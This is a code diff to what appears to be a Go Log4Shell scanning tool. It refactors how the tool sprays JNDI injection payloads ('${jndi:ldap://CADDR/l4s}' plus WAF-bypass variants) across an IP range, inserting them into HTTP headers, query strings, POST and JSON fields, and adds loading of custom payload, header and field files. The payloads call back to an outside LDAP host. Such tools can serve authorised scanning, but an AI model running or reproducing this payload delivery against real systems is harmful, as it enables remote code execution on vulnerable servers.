@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"html/template"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/http"
@@ -57,14 +58,19 @@ func Request(ctx context.Context, opts *RemoteOptions) error {
 
 	finish := (start & mask) | (mask ^ 0xffffffff)
 
+	payloads, err := createPayloads(opts)
+	if err != nil {
+		return err
+	}
+
+	fields, err := readFields(opts)
+	if err != nil {
+		return err
+	}
+
 	sem := semaphore.NewWeighted(int64(10))
 
 	for i := start; i <= finish; i++ {
-		payloads, err := createPayloads(opts)
-		if err != nil {
-			return err
-		}
-
 		for _, payload := range payloads {
 			header, err := createHTTPHeader(opts, payload)
 			if err != nil {
@@ -90,11 +96,6 @@ func Request(ctx context.Context, opts *RemoteOptions) error {
 						return err
 					}
 				case "post":
-					fields, err := readFields()
-					if err != nil {
-						return err
-					}
-
 					data := url.Values{}
 					for _, field := range fields {
 						data.Set(field, p)
@@ -105,11 +106,6 @@ func Request(ctx context.Context, opts *RemoteOptions) error {
 						return err
 					}
 				case "json":
-					fields, err := readFields()
-					if err != nil {
-						return err
-					}
-
 					values := make(map[string]string)
 					for _, field := range fields {
 						values[field] = p
@@ -128,7 +124,7 @@ func Request(ctx context.Context, opts *RemoteOptions) error {
 
 				// Add payload as query string
 				values := req.URL.Query()
-				values.Add("p", payload)
+				values.Add("q", payload)
 				req.URL.RawQuery = values.Encode()
 
 				req.Header = *header
@@ -157,12 +153,10 @@ func Request(ctx context.Context, opts *RemoteOptions) error {
 }
 
 func createHTTPHeader(opts *RemoteOptions, payload string) (*http.Header, error) {
-	data, err := f.ReadFile("resource/header.txt")
+	keys, err := readHeaders(opts)
 	if err != nil {
 		return nil, err
 	}
-
-	keys := strings.Split(string(data), "\n")
 
 	header := &http.Header{}
 
@@ -196,6 +190,20 @@ func createHTTPHeader(opts *RemoteOptions, payload string) (*http.Header, error)
 }
 
 func createPayloads(opts *RemoteOptions) ([]string, error) {
+	if opts.PayLoadsFile != "" {
+		t, err := template.ParseFiles(opts.PayLoadsFile)
+		if err != nil {
+			return nil, err
+		}
+
+		p, err := executeTemplate(t, "l4s", opts.CADDR)
+		if err != nil {
+			return nil, err
+		}
+
+		return parseFileContent(p), nil
+	}
+
 	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}
 
 	if opts.WafBypass {
@@ -204,25 +212,74 @@ func createPayloads(opts *RemoteOptions) ([]string, error) {
 			return nil, err
 		}
 
-		var buf bytes.Buffer
-		if err := t.Execute(&buf, map[string]string{
-			"CADDR":    opts.CADDR,
-			"Resource": "l4s",
-		}); err != nil {
+		p, err := executeTemplate(t, "l4s", opts.CADDR)
+		if err != nil {
 			return nil, err
 		}
 
-		payloads = append(payloads, strings.Split(buf.String(), "\n")...)
+		payloads = append(payloads, parseFileContent(p)...)
 	}
 
 	return payloads, nil
 }
 
-func readFields() ([]string, error) {
+func readFields(opts *RemoteOptions) ([]string, error) {
+	if opts.FieldsFile != "" {
+		data, err := ioutil.ReadFile(opts.FieldsFile)
+		if err != nil {
+			return nil, err
+		}
+
+		return parseFileContent(data), nil
+	}
+
 	data, err := f.ReadFile("resource/fields.txt")
 	if err != nil {
 		return nil, err
 	}
 
-	return strings.Split(string(data), "\n"), nil
+	return parseFileContent(data), nil
+}
+
+func readHeaders(opts *RemoteOptions) ([]string, error) {
+	if opts.HeadersFile != "" {
+		data, err := ioutil.ReadFile(opts.HeadersFile)
+		if err != nil {
+			return nil, err
+		}
+
+		return parseFileContent(data), nil
+	}
+
+	data, err := f.ReadFile("resource/header.txt")
+	if err != nil {
+		return nil, err
+	}
+
+	return parseFileContent(data), nil
+}
+
+func parseFileContent(data []byte) []string {
+	content := []string{}
+
+	for _, d := range strings.Split(string(data), "\n") {
+		d = strings.Trim(d, " ")
+		if !strings.HasPrefix(d, "#") && d != "" { // ignore comments and empty lines
+			content = append(content, d)
+		}
+	}
+
+	return content
+}
+
+func executeTemplate(t *template.Template, resource string, caddr string) ([]byte, error) {
+	var buf bytes.Buffer
+	if err := t.Execute(&buf, map[string]string{
+		"CADDR":    caddr,
+		"Resource": resource,
+	}); err != nil {
+		return nil, err
+	}
+
+	return buf.Bytes(), nil
 }
